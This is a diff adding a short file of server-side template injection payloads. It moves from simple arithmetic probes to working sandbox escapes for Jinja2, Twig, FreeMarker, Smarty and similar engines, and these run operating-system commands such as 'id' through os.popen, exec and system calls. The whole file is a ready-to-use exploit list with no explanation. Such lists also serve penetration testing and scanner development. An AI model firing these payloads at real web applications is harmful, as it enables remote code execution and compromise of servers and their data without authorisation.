@@ -1,0 +1,18 @@
+# SSTI Payloads
+{{7*7}}
+${7*7}}
+<%= 7*7 %>
+#{7*7}
+*{7*7}}
+{{7*'7'}}
+{{config.items()}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{lipsum.__globals__['os'].popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()")}}{%endif%}{%endfor%}
+{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
+{{['id']|filter('system')}}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+{php}echo `id`;{/php}
+
